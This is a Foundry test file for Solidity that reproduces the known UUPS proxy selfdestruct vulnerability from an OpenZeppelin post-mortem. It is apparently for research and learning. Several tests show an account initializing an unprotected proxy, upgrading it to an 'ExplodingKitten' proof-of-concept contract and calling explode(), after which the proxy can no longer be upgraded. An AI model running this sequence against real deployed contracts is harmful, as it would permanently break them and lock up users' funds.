// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {UUPSProxy} from "../src/UUPS_selfdestruct_Fixed/UUPSProxy.sol";
import {SimpleToken} from "../src/UUPS_selfdestruct_Fixed/SimpleToken.sol";
import {SimpleTokenV2} from "../src/UUPS_selfdestruct_Fixed/SimpleTokenV2.sol";
import {ExplodingKitten} from "../src/UUPS_selfdestruct_Fixed/ExplodingKitten.sol";

contract UUPS_selfdestruct is Test {
    // These contracts are from https://github.com/yehjxraymond/exploding-kitten
    // referenced by this post-mortem https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680
    // Some ideas for foundry tests are from https://github.com/FredCoen/Proxy_implementations_with_forge/blob/main/src/test/UUPSProxy.t.sol
    SimpleToken public tokenAddress;
    ExplodingKitten public kittenAddress;
    SimpleTokenV2 public tokenV2;
    UUPSProxy public proxy;

    address public alice;
    address public emptyAddress;
    address public deployer;

    function setUp() public {
        alice = address(0xABCD);
        emptyAddress = address(0xb8b3dbc6);
        deployer = 0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84;

        // Deploy initial logic and proxy contract
        tokenAddress = new SimpleToken(); // Deploy logic contract
        proxy = new UUPSProxy(address(tokenAddress), ""); // Deploy ERC1967 proxy contract with tokenAddress logic as implementation

        // deploy the new V2 contract version, which is used in some tests
        vm.prank(address(alice));
        tokenV2 = new SimpleTokenV2();

        // Exploit PoC will be deployed by alice
        vm.prank(address(alice));
        kittenAddress = new ExplodingKitten(); // Deploy PoC contract
    }

    // Initialize proxy and verify the owner is this contract
    function testProxyInitialize() public {
        (bool s, bytes memory returnedData) = address(proxy).call(abi.encodeWithSignature("initialize()"));
        assertTrue(s);
        (s, returnedData) = address(proxy).call(
            abi.encodeWithSignature("owner()")
        );
        assertTrue(s);
        address owner = abi.decode(returnedData, (address));

        // owner should be this contract
        assertEq(owner, address(this));
    }

    // Initialize proxy as Alice and verify the owner is Alice
    function testAliceProxyInitialize() public {
        vm.prank(address(alice));
        (bool s, bytes memory returnedData) = address(proxy).call(abi.encodeWithSignature("initialize()"));
        assertTrue(s);
        (s, returnedData) = address(proxy).call(
            abi.encodeWithSignature("owner()")
        );
        assertTrue(s);
        address owner = abi.decode(returnedData, (address));

        // owner should be this contract
        assertEq(owner, address(alice));
    }

    // Case of Alice initializing the UUPS proxy and upgrading the contract to tokenV2
    function testAliceV2Upgrade() public {
        // first, initialize
        vm.prank(address(alice));
        (bool a, bytes memory data) = address(proxy).call(abi.encodeWithSignature("initialize()"));
        assertTrue(a);

        // update proxy to new implementation contract
        vm.prank(address(alice));
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("upgradeTo(address)", address(tokenV2))
        );
        assertTrue(a);

        // Confirm logic contract upgrade by calling version()
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("version()")
        );
        string memory verNum = abi.decode(data, (string));
        assertEq(verNum, "v2");
        assertEq(tokenV2.version(), "v2");

        // Confirm logic contract upgrade by calling mint() and then confirming balanceOf()
        vm.prank(address(alice));
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("mint(address,uint256)", address(alice), 1000)
        );
        assertTrue(a);
        // Now check that Alice's balance is 1000, to match the previous minting action
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("balanceOf(address)", address(alice))
        );
        assertTrue(a);
        uint256 aliceBalance = abi.decode(data, (uint256));
        assertEq(aliceBalance, 1000);
    }

    // Case of Alice initializing the UUPS proxy and upgrading the contract to the PoC contract
    function testAlicePoCDemo() public {
        // first, initialize
        vm.prank(address(alice));
        (bool a, bytes memory data) = address(proxy).call(abi.encodeWithSignature("initialize()"));
        assertTrue(a);

        // update proxy to PoC contract
        // Should be possible to do the next 2 steps in 1 step with upgradeToAndCall(), but this was easier to debug and make work
        vm.prank(address(alice));
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("upgradeTo(address)", address(kittenAddress))
        );
        assertTrue(a);

        // update proxy to PoC contract
        vm.prank(address(alice));
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("explode()")
        );
        assertTrue(a);

        // The proxy cannot be used for any future upgrades at this point
    }

    // Case of Alice initializing the UUPS proxy and upgrading the contract to the PoC contract, then showing it cannot be upgraded further
    function testFailAlicePoCFirstThenTryV2Upgrade() public {
        // first, initialize
        vm.prank(address(alice));
        (bool a, bytes memory data) = address(proxy).call(abi.encodeWithSignature("initialize()"));
        assertTrue(a);

        // update proxy to PoC contract
        // Should be possible to do the next 2 steps in 1 step with upgradeToAndCall(), but this was easier to debug and make work
        vm.prank(address(alice));
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("upgradeTo(address)", address(kittenAddress))
        );
        assertTrue(a);

        // Call explode() in PoC contract
        vm.prank(address(alice));
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("explode()")
        );
        assertTrue(a);

        // Attempt to update proxy to tokenV2 contract
        vm.prank(address(alice));
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("upgradeTo(address)", address(tokenV2))
        );
        assertTrue(a); // call returns true because it's the same as calling an address without code

        // Attempt to call version(), but it fails because tokenV2 is not used
        vm.prank(address(alice));
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("version()")
        );
        assertTrue(a);

        // Attempt to call return42(), but this too fails
        vm.prank(address(alice));
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("return42()")
        );
        assertTrue(a);
    }

    
}
